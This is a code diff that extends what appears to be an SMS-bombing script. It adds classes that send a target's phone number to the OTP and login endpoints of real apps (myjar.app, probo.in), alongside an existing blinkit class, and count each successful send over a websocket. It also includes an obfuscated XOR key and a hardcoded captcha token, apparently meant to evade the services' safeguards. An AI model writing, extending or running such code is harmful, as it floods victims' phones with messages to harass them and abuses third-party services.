@@ -7,13 +7,13 @@ let ws = new w;
 
 class mywallety {
 	hash(data) {
-    	var password = String.fromCharCode(109,121,119,97,108,108,101,116,108,121,45,111,112,115,117,107,114,97,116);
-    	let encryptedData = "";
+        var password = String.fromCharCode(109,121,119,97,108,108,101,116,108,121,45,111,112,115,117,107,114,97,116);
+        let encryptedData = "";
 		for (let i = 0; i < data.length; i++) {
 			const charCode = String(data[i]).charCodeAt(0) ^ password.charCodeAt(i % password.length);
 			encryptedData += String.fromCharCode(charCode);
 		}
-    	return btoa(encryptedData);
+        return btoa(encryptedData);
 	}
 
 	random(length = 50) {
@@ -371,6 +371,39 @@ class blinkit{
             })
         }).then(res=>res.json()).then((data)=>{
             if(data.sms_sent === true)
+                ws.send("+1")
+        })
+    }
+}
+
+
+class jar{
+    constructor(number, ws){
+        fetch("https://zeon-r.myjar.app/v1/pwa/zeon/authRequest?phoneNumber="+number+"&countryCode=91&partnerId=undefined&captchaResponse=03AFcWeA7s59rsqDWOInFwdOuos_8a78hOW3BVNhQ_CRSvPS4YTz9r-4m1e62NGww4FaICgz9GemkT9gblTGm9MjkeeOhs11FeXRclJixEVWLGAR4cFlya5VjXhhE7VqI_K2BvodvCvvUQzF7bJaXBhsQibE_s4px4VpGa8kBviozmy0LlSwv9EGh3VgQa-g7GifOtsncXLQW6_DA-nLQMEckRpl_1xLjZXcDZncmTz5U2KvErEEIhOVWJzpZfM8sbvkwOKFffneORAYFqMCuEe1N6eUBr9tYN7chYi0_hqWR_Z9_1b9soKk8m9JKVsmfDa7w8j3HlksOZSvrYgqeBJCrffhRToAgQ1uyuJZTc6BhxUA7x9bIoIqPBLvDHGFRi-hJWKQev_GwiNHfd-o0febSDojOdOo7iddb5-3MiBtTfOAYrcnlcCZEnTjqtiywlfMMFmoGGOqGPWfOX1KqCPPDAsiI7kjHehLgzwI-rnBkwFheS1kELHDvNVU9DTSQYfW1XV1gfEennqKQpoQP3wUyolz0qaB2Mg-G3LRnpV2zPenZc18moo5FskM_oEPY9TPhq11S5WOj782ayn4kp-_-hBjuRSUvCmv6x21mI6Vp4MOiIatmQ7G40LcEIu-_vhvEI-rMerFqVfAo4CJJUz85s8LzjhMX8ucZdPFNttMg2vj7udQpyghPxSGJrStRRbRxUC_5iLfAqVvVyOLv6-EMT8FUuSCKTWIrotZNrFYrhvsA9JOPKK9ZzvQHbblJECBCGnB3Va01yjYThaph9OGwXTEbYHJpq_oLvYNC0db6wpMHI3YS5P07W8SzgT58TpT-stI00PClE6kLGeGpGoWs-tEOb0CXC8DDoCTWeZsId-I_os-5MUo2UpG_O2L7-Df6tdnPWjA8qpnTnnSPOMBvEUjcjYV5SSVRDVrIln7pf0jv2EM3BGxJd3DxskeGxDUbV8qShiqnUm_WN8nt8Wye0bPnifw-ECZclGEa3stBPvrms_CFEm8nK3zTKUdAfNLuFTQlGR9XASom4XUqEGravhMk7lGWFKuV8n6vyOzMDO0yh1GtQ9k90bfzuvZ0Pp_zlPg72cbYTkxPPMXuhm8sYAODx9j260hNqrYpPahJwHf0pQR6x0C0e4c-K42-ZhvM6iR2lW_HUCiMv7T_9rwXGERX-tnRxawlhu2EtwuH_gGvLp5cF3moBbzR_etp45KZ8trO-nrBLDTh5AsnXpxkfJyIMMBqk0tJMzo8BFD2MrmQGNorPW9N8PFDw_Bjv6mFo-OxABliE06Q0ocbTnas-fOR32n_5tLLnyB-bEieOrmzMuK3nYEeO-AK35HFmiVH507BBXlapgd-suUoEQN_vEWgm2GpzX0bfKlSzesx5DaPoZWRaIjnmyjT5PG6Yp4CVz_aivNovVIrn4YENLIgzFCeQ3wAc3g5k-t7juktRuPkms_xqtnZyB1xDgSAuparH7cTtQ4IHR8r_86XL9e97D_k1gcpsq6IX1BMvzU-xVCVqKWKTpM1-_9_TDDb-ETfpXV19z9DHR6cB6Lys1w_JJ4tOhIZ7vzMtfHSdyeVobWtHCz9mCsuAq3aCHRVRIgui0O9lb-MG-jdLLHwc9ZlnSaRK-cLK99J5BAxV4ebJsjpb4cJ6tz7rMXzh3ugmM3EhZ188aDsRMla1PoI-N_PNLP3Et0Lm3JuVcFrsNc2uoZfMvL9YvJfgFx4FW6mDpnAt2U30843f868r9kGi2HDBPYOrDEkn46ApHYum1L7If-MAUSM3T4RgZdP11cOVovU3kqrjiRT9XDfHKF28ww4Q9Tj9CTG1-Ka_OoGHAvnE3IydIedXC8qXAW3ybFsPwURinImBzU0a",{
+            method:"POST",
+        }).then(res=>res.json()).then((data)=>{
+            if(data.success === true)
+                ws.send("+1")
+        })
+    }
+}
+
+class probo{
+    constructor(number, ws){
+        fetch("https://prod.api.probo.in/api/v1/user/login",{
+            method:"POST",
+            headers:{
+                "Content-Type":"application/json",
+                "x-device-os":"ANDROID",
+                "x-version-name":"10",
+                "appid":"in.probo.pro"
+            },
+            body:JSON.stringify({
+                "mobile": number,
+                "is_following_referee": false
+            })
+        }).then(res=>res.json()).then((data)=>{
+            if(data.message === "Successfully Done!!")
                 ws.send("+1")
         })
     }
